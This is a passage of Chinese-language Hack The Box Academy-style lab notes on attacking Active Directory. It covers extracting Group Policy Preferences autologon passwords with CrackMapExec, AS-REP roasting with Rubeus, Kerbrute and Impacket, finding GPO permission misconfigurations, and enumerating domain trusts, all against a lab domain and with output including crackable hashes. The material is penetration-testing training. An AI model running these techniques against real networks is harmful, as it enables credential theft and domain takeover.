<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ crackmapexec smb -L | grep gpp<br><br>[*] gpp_autologin             Searches the domain controller <span class="hljs-keyword">for</span> registry.xml to find autologon information and returns the username and password.<br>[*] gpp_password              Retrieves the plaintext password and other information <span class="hljs-keyword">for</span> accounts pushed through Group Policy Preferences.<br></code></pre></td></tr></table></figure>

<h4 id="使用-CrackMapExec-的-gpp-autologin-模块"><a href="#使用-CrackMapExec-的-gpp-autologin-模块" class="headerlink" title="使用 CrackMapExec 的 gpp_autologin 模块"></a>使用 CrackMapExec 的 gpp_autologin 模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 <br>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share<br>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching <span class="hljs-keyword">for</span> Registry.xml<br>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml<br>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials <span class="hljs-keyword">in</span> INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml<br>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: [<span class="hljs-string">&#x27;guarddesk&#x27;</span>]<br>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: [<span class="hljs-string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span>]<br>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: [<span class="hljs-string">&#x27;ILFreightguardadmin!&#x27;</span>]<br></code></pre></td></tr></table></figure>

<h3 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h3><h4 id="使用-Get-DomainUser-枚举-DONT-REQ-PREAUTH-值"><a href="#使用-Get-DomainUser-枚举-DONT-REQ-PREAUTH-值" class="headerlink" title="使用 Get-DomainUser 枚举 DONT_REQ_PREAUTH 值"></a>使用 Get-DomainUser 枚举 DONT_REQ_PREAUTH 值</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-PreauthNotRequired</span> | <span class="hljs-built_in">select</span> samaccountname,userprincipalname,useraccountcontrol | <span class="hljs-built_in">fl</span><br><br>samaccountname     : mmorgan<br>userprincipalname  : mmorgan@inlanefreight.local<br>useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH<br></code></pre></td></tr></table></figure>

<h4 id="使用-Rubeus-以正确格式检索-AS-REP"><a href="#使用-Rubeus-以正确格式检索-AS-REP" class="headerlink" title="使用 Rubeus 以正确格式检索 AS-REP"></a>使用 Rubeus 以正确格式检索 AS-REP</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v2.<span class="hljs-number">0.2</span><br><br>[*] Action: AS<span class="hljs-literal">-REP</span> roasting<br><br>[*] Target User            : mmorgan<br>[*] Target Domain          : INLANEFREIGHT.LOCAL<br><br>[*] Searching path <span class="hljs-string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))&#x27;</span><br>[*] SamAccountName         : mmorgan<br>[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL<br>[*] <span class="hljs-keyword">Using</span> domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)<br>[*] Building AS<span class="hljs-literal">-REQ</span> (w/o preauth) <span class="hljs-keyword">for</span>: <span class="hljs-string">&#x27;INLANEFREIGHT.LOCAL\mmorgan&#x27;</span><br>[+] AS<span class="hljs-literal">-REQ</span> w/o preauth successful!<br>[*] AS<span class="hljs-literal">-REP</span> hash:<br>     <span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$23</span><span class="hljs-variable">$mmorgan</span>@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55<span class="hljs-variable">$097</span>......<br></code></pre></td></tr></table></figure>

<h4 id="使用-Kerbrute-获取-AS-REP"><a href="#使用-Kerbrute-获取-AS-REP" class="headerlink" title="使用 Kerbrute 获取 AS-REP"></a>使用 Kerbrute 获取 AS-REP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt <br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \<br> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/<br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop<br><br>2022/04/01 13:14:17 &gt;  Using KDC(s):<br>2022/04/01 13:14:17 &gt;  	172.16.5.5:88<br><br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 tjohnson@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jwilson@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 bdavis@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 njohnson@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 asanchez@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 dlewis@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 ccruz@inlanefreight.local<br>2022/04/01 13:14:17 &gt;  [+] mmorgan has no pre auth required. Dumping <span class="hljs-built_in">hash</span> to crack offline:<br>$krb5asrep$23<span class="hljs-variable">$mmorgan</span>@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33<span class="hljs-variable">$8698e</span>.......<br></code></pre></td></tr></table></figure>

<h4 id="无需预认证的-Kerberoast-用户狩猎"><a href="#无需预认证的-Kerberoast-用户狩猎" class="headerlink" title="无需预认证的 Kerberoast 用户狩猎"></a>无需预认证的 Kerberoast 用户狩猎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users <br>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation<br><br>[-] User sbrown@inlanefreight.local doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User jjones@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User tjohnson@inlanefreight.local doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User jwilson@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User bdavis@inlanefreight.local doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User njohnson@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User asanchez@inlanefreight.local doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User dlewis@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User ccruz@inlanefreight.local doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9</span><br><span class="hljs-string">[-] User rramirez@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br>[-] User jwallace@inlanefreight.local doesn<span class="hljs-string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="hljs-string">[-] User jsantiago@inlanefreight.local doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="hljs-built_in">set</span><br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="组策略对象（GPO）滥用"><a href="#组策略对象（GPO）滥用" class="headerlink" title="组策略对象（GPO）滥用"></a>组策略对象（GPO）滥用</h3><p>组策略为管理员提供了许多高级设置，这些设置可以应用于 AD 环境中的用户和计算机对象。正确使用时，组策略是通过配置用户设置、操作系统和应用程序来强化 AD 环境的绝佳工具。然而，组策略也可能被攻击者滥用。如果我们能够通过 ACL 配置错误获得对组策略对象的权限，我们就可以利用这一点进行横向移动、权限提升，甚至域控制，并在域内作为持久性机制。了解如何枚举和攻击 GPO 可以帮助我们在高度受限的环境中取得优势，有时甚至成为达成目标的关键。</p>
<h4 id="使用-PowerView-枚举-GPO-名称"><a href="#使用-PowerView-枚举-GPO-名称" class="headerlink" title="使用 PowerView 枚举 GPO 名称"></a>使用 PowerView 枚举 GPO 名称</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainGPO</span> |<span class="hljs-built_in">select</span> displayname<br><br>displayname<br><span class="hljs-literal">-----------</span><br>Default Domain Policy<br>Default Domain Controllers Policy<br>Deny Control Panel Access<br>Disallow LM Hash<br>Deny CMD Access<br>Disable Forced Restarts<br>Block Removable Media<br>Disable Guest Account<br>Service Accounts Password Policy<br>Logon Banner<br>Disconnect Idle RDP<br>Disable NetBIOS<br>AutoLogon<br>GuardAutoLogon<br>Certificate Services<br></code></pre></td></tr></table></figure>

<h4 id="使用内置-Cmdlet-枚举-GPO-名称"><a href="#使用内置-Cmdlet-枚举-GPO-名称" class="headerlink" title="使用内置 Cmdlet 枚举 GPO 名称"></a>使用内置 Cmdlet 枚举 GPO 名称</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-GPO</span> <span class="hljs-literal">-All</span> | <span class="hljs-built_in">Select</span> DisplayName<br><br>DisplayName<br><span class="hljs-literal">-----------</span><br>Certificate Services<br>Default Domain Policy<br>Disable NetBIOS<br>Disable Guest Account<br>AutoLogon<br>Default Domain Controllers Policy<br>Disconnect Idle RDP<br>Disallow LM Hash<br>Deny CMD Access<br>Block Removable Media<br>GuardAutoLogon<br>Service Accounts Password Policy<br>Logon Banner<br>Disable Forced Restarts<br>Deny Control Panel Access<br></code></pre></td></tr></table></figure>

<h4 id="枚举域用户组策略权限"><a href="#枚举域用户组策略权限" class="headerlink" title="枚举域用户组策略权限"></a>枚举域用户组策略权限</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-variable">$sid</span>=<span class="hljs-built_in">Convert-NameToSid</span> <span class="hljs-string">&quot;Domain Users&quot;</span><br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainGPO</span> | <span class="hljs-built_in">Get-ObjectAcl</span> | ?&#123;<span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-eq</span> <span class="hljs-variable">$sid</span>&#125;<br><br>ObjectDN              : CN=&#123;<span class="hljs-number">7</span>CA9C789<span class="hljs-literal">-14CE-46E3-A722-83F4097AF532</span>&#125;,CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL<br>ObjectSID             :<br>ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,<br>                        WriteOwner<br>BinaryLength          : <span class="hljs-number">36</span><br>AceQualifier          : AccessAllowed<br>IsCallback            : False<br>OpaqueLength          : <span class="hljs-number">0</span><br>AccessMask            : <span class="hljs-number">983095</span><br>SecurityIdentifier    : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-513</span><br>AceType               : AccessAllowed<br>AceFlags              : ObjectInherit, ContainerInherit<br>IsInherited           : False<br>InheritanceFlags      : ContainerInherit, ObjectInherit<br>PropagationFlags      : None<br>AuditFlags            : None<br></code></pre></td></tr></table></figure>

<h4 id="将-GPO-GUID-转换为名称"><a href="#将-GPO-GUID-转换为名称" class="headerlink" title="将 GPO GUID 转换为名称"></a>将 GPO GUID 转换为名称</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb <span class="hljs-built_in">Get-GPO</span> <span class="hljs-literal">-Guid</span> <span class="hljs-number">7</span>CA9C789<span class="hljs-literal">-14CE-46E3-A722-83F4097AF532</span><br><br>DisplayName      : Disconnect Idle RDP<br>DomainName       : INLANEFREIGHT.LOCAL<br>Owner            : INLANEFREIGHT\Domain Admins<br>Id               : <span class="hljs-number">7</span>ca9c789<span class="hljs-literal">-14ce-46e3-a722-83f4097af532</span><br>GpoStatus        : AllSettingsEnabled<br>Description      :<br>CreationTime     : <span class="hljs-number">10</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2021</span> <span class="hljs-number">3</span>:<span class="hljs-number">34</span>:<span class="hljs-number">07</span> PM<br>ModificationTime : <span class="hljs-number">4</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">54</span>:<span class="hljs-number">25</span> PM<br>UserVersion      : AD Version: <span class="hljs-number">0</span>, SysVol Version: <span class="hljs-number">0</span><br>ComputerVersion  : AD Version: <span class="hljs-number">0</span>, SysVol Version: <span class="hljs-number">0</span><br>WmiFilter        :<br></code></pre></td></tr></table></figure>

<h1 id="拿下一个域后，向着其他域进攻"><a href="#拿下一个域后，向着其他域进攻" class="headerlink" title="拿下一个域后，向着其他域进攻"></a>拿下一个域后，向着其他域进攻</h1><h2 id="域信任概述"><a href="#域信任概述" class="headerlink" title="域信任概述"></a>域信任概述</h2><p>信任用于建立森林间或域间（域内）的身份验证，使用户能够访问其账户所在主域之外的其他域中的资源（或执行管理任务）。信任在两个域的身份验证系统之间创建链接，并可能允许单向或双向（双向）通信。组织可以创建多种类型的信任：</p>
<ul>
<li><code>Parent-child</code> : 同一林中的两个或多个域。子域与父域之间存在双向可传递信任关系，这意味着子域 <code>corp.inlanefreight.local</code> 中的用户可以向父域 <code>inlanefreight.local</code> 进行身份验证，反之亦然。</li>
<li><code>Cross-link</code> : 子域之间的信任关系，以加快身份验证速度。</li>
<li><code>External</code> : 两个独立域之间在不同林中且未通过林信任连接的非传递性信任。此类信任使用 SID 过滤或过滤掉来自非受信任域的认证请求（通过 SID）。</li>
<li><code>Tree-root</code> : 森林根域与新树根域之间的双向可传递信任。当您在森林中设置新树根域时，它们是按设计创建的。</li>
<li><code>Forest</code> : 两个林根域之间的传递信任。</li>
<li>ESAE：用于管理 Active Directory 的堡垒森林。</li>
</ul>
<p>在建立信任时，某些元素可以根据业务案例进行修改。</p>
<p>信任可以是可传递的或不可传递的。</p>
<ul>
<li><code>transitive</code> 信任意味着信任被扩展到子域信任的对象。例如，假设我们有三个域。在传递性关系中，如果 <code>Domain A</code> 与 <code>Domain B</code> 建立了信任关系，并且 <code>Domain B</code> 与 <code>Domain C</code> 建立了 <code>transitive</code> 信任关系，那么 <code>Domain A</code> 将自动信任 <code>Domain C</code> 。</li>
<li>在 <code>non-transitive trust</code> 中，子域本身是唯一受信任的。</li>
</ul>
<h2 id="枚举信任关系"><a href="#枚举信任关系" class="headerlink" title="枚举信任关系"></a>枚举信任关系</h2><h3 id="使用-Get-ADTrust"><a href="#使用-Get-ADTrust" class="headerlink" title="使用 Get-ADTrust"></a>使用 Get-ADTrust</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Import-Module</span> activedirectory<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-ADTrust</span> <span class="hljs-literal">-Filter</span> *<br><br>Direction               : BiDirectional<br>DisallowTransivity      : False<br>DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL<br>ForestTransitive        : False<br>IntraForest             : True<br>IsTreeParent            : False<br>IsTreeRoot              : False<br>Name                    : LOGISTICS.INLANEFREIGHT.LOCAL<br>ObjectClass             : trustedDomain<br>ObjectGUID              : f48a1169<span class="hljs-literal">-2e58-42c1-ba32-a6ccb10057ec</span><br>SelectiveAuthentication : False<br>SIDFilteringForestAware : False<br>SIDFilteringQuarantined : False<br>Source                  : DC=INLANEFREIGHT,DC=LOCAL<br>Target                  : LOGISTICS.INLANEFREIGHT.LOCAL<br>TGTDelegation           : False<br>TrustAttributes         : <span class="hljs-number">32</span><br>TrustedPolicy           :<br>TrustingPolicy          :<br>TrustType               : Uplevel<br>UplevelOnly             : False<br>UsesAESKeys             : False<br>UsesRC4Encryption       : False<br><br>Direction               : BiDirectional<br>DisallowTransivity      : False<br>DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL<br>ForestTransitive        : True<br>IntraForest             : False<br>IsTreeParent            : False<br>IsTreeRoot              : False<br>Name                    : FREIGHTLOGISTICS.LOCAL<br>ObjectClass             : trustedDomain<br>ObjectGUID              : <span class="hljs-number">1597717</span>f<span class="hljs-literal">-89b7-49b8-9cd9-0801d52475ca</span><br>SelectiveAuthentication : False<br>SIDFilteringForestAware : False<br>SIDFilteringQuarantined : False<br>Source                  : DC=INLANEFREIGHT,DC=LOCAL<br>Target                  : FREIGHTLOGISTICS.LOCAL<br>TGTDelegation           : False<br>TrustAttributes         : <span class="hljs-number">8</span><br>TrustedPolicy           :<br>TrustingPolicy          :<br>TrustType               : Uplevel<br>UplevelOnly             : False<br>UsesAESKeys             : False<br>UsesRC4Encryption       : False<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainTrust-检查现有信任关系"><a href="#使用-Get-DomainTrust-检查现有信任关系" class="headerlink" title="使用 Get-DomainTrust 检查现有信任关系"></a>使用 Get-DomainTrust 检查现有信任关系</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainTrust</span> <br><br>SourceName      : INLANEFREIGHT.LOCAL<br>TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : WITHIN_FOREST<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">6</span>:<span class="hljs-number">20</span>:<span class="hljs-number">22</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">55</span>:<span class="hljs-number">55</span> PM<br><br>SourceName      : INLANEFREIGHT.LOCAL<br>TargetName      : FREIGHTLOGISTICS.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : FOREST_TRANSITIVE<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">8</span>:<span class="hljs-number">07</span>:<span class="hljs-number">09</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">02</span>:<span class="hljs-number">39</span> AM<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainTrustMapping"><a href="#使用-Get-DomainTrustMapping" class="headerlink" title="使用 Get-DomainTrustMapping"></a>使用 Get-DomainTrustMapping</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainTrustMapping</span><br><br>SourceName      : INLANEFREIGHT.LOCAL<br>TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : WITHIN_FOREST<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">6</span>:<span class="hljs-number">20</span>:<span class="hljs-number">22</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">55</span>:<span class="hljs-number">55</span> PM<br><br>SourceName      : INLANEFREIGHT.LOCAL<br>TargetName      : FREIGHTLOGISTICS.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : FOREST_TRANSITIVE<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">8</span>:<span class="hljs-number">07</span>:<span class="hljs-number">09</span> PM<br>WhenChanged     : <span 